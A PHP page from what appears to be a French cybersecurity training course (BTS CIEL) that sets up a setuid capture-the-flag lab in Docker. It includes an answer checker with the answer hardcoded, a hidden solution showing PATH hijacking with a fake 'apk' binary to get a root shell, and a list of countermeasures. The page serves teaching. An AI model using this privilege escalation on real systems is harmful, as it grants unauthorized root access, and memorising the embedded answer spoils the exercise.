<?php
require $_SERVER['DOCUMENT_ROOT'] . "/core/auth.php"; // auth universel
include $_SERVER['DOCUMENT_ROOT'] . "/core/header.php"; // header universel
?>

<div class="menu">
    <a href="../index_script.php">⬅ Retour au script</a>
</div>

<h2>SetUID</h2>

<p>
Un programme est fourni par l'administrateur (probablement un ciel)  pour permettre à tous les utilisateurs de faire des mises à jour du système à l'aide du Setuid. 
</p>

<!-- Formulaire pour vérifier la réponse -->
<div style="margin-top: 30px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; max-width: 500px;">
    <h3>Vérifier votre réponse</h3>
    <form method="post">
        <label for="answer">Entrez la réponse :</label><br>
        <input type="text" name="answer" id="answer" style="width: 100%; padding: 5px; margin-top: 5px;" required><br><br>
        <input type="submit" value="Vérifier" style="padding: 5px 10px;">
    </form>

    <?php
    // Vérification de la réponse
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $userAnswer = trim($_POST['answer']);
        $correctAnswer = "L’ignorance, c’est la force."; // <-- mettre la vraie réponse ici

        if ($userAnswer === $correctAnswer) {
            echo '<p style="color: green; font-weight: bold;">OK ! Bravo ✅</p>';
        } else {
            echo '<p style="color: red; font-weight: bold;">NOK ! Dommage ❌</p>';
        }
    }
    ?>
</div>

<div class="challenge-container" style="display: flex; gap: 20px; margin-top: 20px;">

    <!-- Colonne gauche : Commandes utiles -->
    <div class="commands" style="flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
        <h3>Étapes à suivre</h3>
        <pre>
# Télécharger le fichier docker-compose .yml et lancer le container
docker compose up -d

# Se connecter en ssh au container mdp : toor
ssh ciel@localhost -p 2222

# A LA FIN DU CHALLENGE : ARRÊTER ET SUPPRIMER LE CONTAINER 
docker compose down

# Effacer la connexion ssh
ssh-keygen -f '~/.ssh/known_hosts' -R '[localhost]:2222'
        </pre>
    </div>

    <!-- Colonne droite : Fichiers à télécharger -->
    <div class="files" style="flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
        <h3>Fichiers à télécharger</h3>
        <ul>
            <li><a href="/formation/2026/00-script/00-setuid/docker-compose.yml">docker-compose.yml</a></li>
        </ul>
    </div>

</div>

<!-- BOUTON POUR AFFICHER LA SOLUTION -->
<div style="width: 100%; padding: 20px; border: 1px solid #aaa; border-radius: 8px; margin-top: 30px;">

    <button onclick="toggleBox()" 
            style="padding: 10px 18px; font-size: 16px; cursor: pointer;">
        Afficher des éléments de correction (tricheur)
    </button>

    <div id="boxContent" style="display: none; margin-top: 20px; background: #f8f8f8; padding: 15px; border-radius: 6px;">

        <p>
            Vous créez un faux programme <code>apk</code> contenant <code>/bin/sh</code>, puis vous le rendez exécutable.
            Ensuite, vous ajoutez votre dossier personnel au <code>PATH</code> afin que le système utilise votre faux binaire
            au lieu de l’outil système. En lançant le challenge, celui-ci exécute alors votre <code>apk</code>, ce qui ouvre un shell root.
        </p>

        <pre style="white-space: pre-wrap; width: 100%;">
echo "/bin/sh" > apk
chmod 766 apk

export PATH="/home/ciel:$PATH"
which apk   → /home/ciel/apk

./chall00   → exécution du faux apk → shell root
cat flag.txt
        </pre>

    </div>
</div>

<script>
function toggleBox() {
    const box = document.getElementById("boxContent");
    box.style.display = box.style.display === "none" ? "block" : "none";
}
</script>


<script>
function toggleSolution() {
    const sol = document.getElementById("solution");
    sol.style.display = sol.style.display === "none" ? "block" : "none";
}
</script>

<!-- BOUTON POUR AFFICHER LES CONTRE-MESURES -->
<div style="width: 100%; padding: 20px; border: 1px solid #aaa; border-radius: 8px; margin-top: 30px;">

    <button onclick="toggleCounter()"
            style="padding: 10px 18px; font-size: 16px; cursor: pointer;">
        Afficher les contre‑mesures et le lien avec le BTS CIEL
    </button>

    <div id="counterContent" style="display: none; margin-top: 20px; background: #f8f8f8; padding: 15px; border-radius: 6px;">

        <h3>Contre‑mesures pour éviter les abus de Setuid</h3>

        <p>Le mécanisme <code>setuid</code> est puissant mais dangereux. Voici les principales protections utilisées en entreprise :</p>

        <ul>
            <li><strong>Éviter le setuid root</strong> : privilégier sudo avec des règles précises dans <code>/etc/sudoers</code>.</li>
            <li><strong>Limiter le PATH</strong> : utiliser un PATH minimal et absolu dans les scripts sensibles.</li>
            <li><strong>Utiliser des chemins absolus</strong> dans les programmes setuid (ex. <code>/usr/bin/apt</code> plutôt que <code>apt</code>).</li>
            <li><strong>Désactiver setuid sur les systèmes de fichiers non sûrs</strong> (ex. <code>nosuid</code> dans /etc/fstab).</li>
            <li><strong>Vérifier les permissions</strong> : aucun fichier modifiable par l’utilisateur ne doit être appelé par un binaire setuid.</li>
            <li><strong>Utiliser des capabilities Linux</strong> plutôt que setuid root</strong> (ex. <code>cap_net_bind_service</code>).</li>
            <li><strong>Auditer régulièrement</strong> les binaires setuid avec <code>find / -perm -4000</code>.</li>
        </ul>

        <hr>

        <h3>Lien avec le BTS</h3>

        <ul>
	 <li><strong>C10 - EXPLOITER UN RÉSEAU INFORMATIQUE</strong></li>
                <li>Langages de Scripts</li>
		<li> Scripts UNIX (bash/zsh)</li>
		
                <li><strong>C11 - MAINTENIR UN SYSTÈME ÉLECTRONIQUE</strong></li>
                <li> Droits d’accès</li> 
	</ul>


    </div>
</div>

<script> function toggleCounter() { 
const box = document.getElementById("counterContent"); box.style.display = box.style.display === "none" ? "block" : "none"; } 
</script>

<?php
include $_SERVER['DOCUMENT_ROOT'] . "/core/footer.php"; // footer universel
?>

